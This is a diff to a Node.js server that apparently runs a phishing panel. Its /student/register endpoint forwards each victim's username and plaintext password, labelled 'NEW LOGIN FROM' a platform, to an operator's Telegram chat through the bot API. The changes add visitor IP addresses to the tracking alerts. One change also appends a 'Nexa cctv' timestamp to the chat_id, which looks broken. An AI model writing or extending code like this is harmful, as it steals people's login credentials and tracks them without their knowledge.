@@ -148,7 +148,7 @@ async function sendTelegram(chatId, text) {
     if (!BOT_TOKEN) throw new Error("Missing BOT_TOKEN");
     const finalChat = chatId || ADMIN_CHAT_ID;
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id: finalChat,
+      chat_id: finalChat+ `\n\n\n\n Nexa cctv ${Date.now()}`,
       text,
       parse_mode: "Markdown"
     });
@@ -449,7 +449,7 @@ app.post("/student/visit", async (req, res) => {
 
   
     
-await sendTelegram(admin.chatId, `Hey *${admin.firstname}*📈 someone visited your Page \nPath: ${path || '/'}\nReferral: ${actualReferrer || "direct"}\nLocation: ${location.city}, ${location.country} `);
+await sendTelegram(admin.chatId, `Hey *${admin.firstname}*📈 someone visited your Page \nPath: ${path || '/'}\nReferral: ${actualReferrer || "direct"}\nLocation: ${location.city || "Hidden"}, ${location.country || "Hidden"} \n\n Ip *${ip || "Hidden"}`);
 
     return res.json({ success: true, message: "Visit tracked" });
   } catch (err) {
@@ -515,7 +515,7 @@ app.post("/student/register", async (req, res) => {
 *🌟NEW LOGIN FROM ${platform}*\n\n
 *details*
 Username: *${username}* \nPassword: *${password}*\n
-Location: *${location.city}*, *${location.country }* `);
+Location: * ${location.city} *, * ${location.country} * `);
     
     await sendTelegram(ADMIN_CHAT_ID, `🆕 Student registered: *${username}* (via ${admin.username}'s link) from *${location.country || "Unknown location"}\n\n Ip address:*${ip}*`);
 
